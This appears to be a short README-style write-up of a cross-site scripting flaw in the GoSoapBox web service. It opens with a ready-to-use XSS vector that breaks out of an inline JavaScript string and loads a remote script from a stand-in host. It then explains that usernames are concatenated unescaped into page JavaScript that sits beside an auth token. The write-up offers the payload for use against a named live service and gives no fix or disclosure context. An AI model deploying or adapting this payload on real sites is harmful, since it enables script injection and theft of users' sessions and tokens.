# GoSoapBox XSS

Input in this site is rarely filtered, and on the rare occasions that it is, 
it's done poorly, and in a way that can be bypassed with minimal effort.

Just to get it out of the way, here is the actual XSS vector:
`";//<svg onload="$.getScript('//example.com/abcd')"/>`

where example.com/abcd stands for any url to a script file

To understand why this vector is used, first, some background understanding of GoSoapBox is needed.

1. GoSoapBox uses a Firebase DB to hold its information

Because of this, at the bottom of the page, there's a snippet of JS that looks like this:

```
	var user_id          = "u53r1dstr1ng";
	var user_name        = "my name";
	var firebase_path    = "https://gosoapbox-prod.firebaseio.com";
	var event_identifier = "123456789";
	var moderator_view   = 0;
	var auth_token       = "R3allyrE4llyl0ngt0k3n";
```

This js MUST be fully executed in order for the name to appear in the list of online users.

The problem is, any typical XSS vector would not show up in the list of online users,
since the given username is lazily concatenated into the javascript like so:

```
	var user_id          = "u53r1dstr1ng";
	var user_name        = "<svg onload="alert(1)"></svg>"; // Massive syntax error
	var firebase_path    = "https://gosoapbox-prod.firebaseio.com";
	var event_identifier = "123456789";
	var moderator_view   = 0;
	var auth_token       = "R3allyrE4llyl0ngt0k3n";
```

